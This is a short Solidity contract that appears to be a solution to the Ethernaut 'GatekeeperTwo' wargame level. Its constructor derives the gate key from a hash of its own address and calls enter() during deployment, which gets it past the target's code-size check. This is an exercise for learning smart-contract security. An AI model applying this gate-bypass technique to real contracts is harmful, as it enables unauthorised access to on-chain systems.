// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "./GatekeeperTwo.sol";


contract BatteringRam2 {
    GatekeeperTwo public GatekeeperTwoContract;

    constructor(address _GatekeeperTwoContract){
        GatekeeperTwoContract = GatekeeperTwo(_GatekeeperTwoContract);
        uint64 key = ~(uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        require(GatekeeperTwoContract.enter(bytes8(key)), "failed");
    }
}
